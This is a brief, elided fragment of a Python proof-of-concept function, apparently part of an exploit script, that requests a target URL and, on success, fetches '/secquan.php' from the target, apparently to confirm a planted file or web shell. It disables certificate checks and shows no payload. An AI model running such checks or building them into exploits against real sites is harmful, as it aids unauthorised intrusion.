...
def poc(url):
    ...
    try:
        res = requests.get(url, headers=headers, timeout=5, allow_redirects=False, verify=False)
        if res.status_code == 200:
            url2 = target + "/secquan.php"
            res2 = requests.get(url2, headers=headers, timeout=5, allow_redirects=False, verify=False)
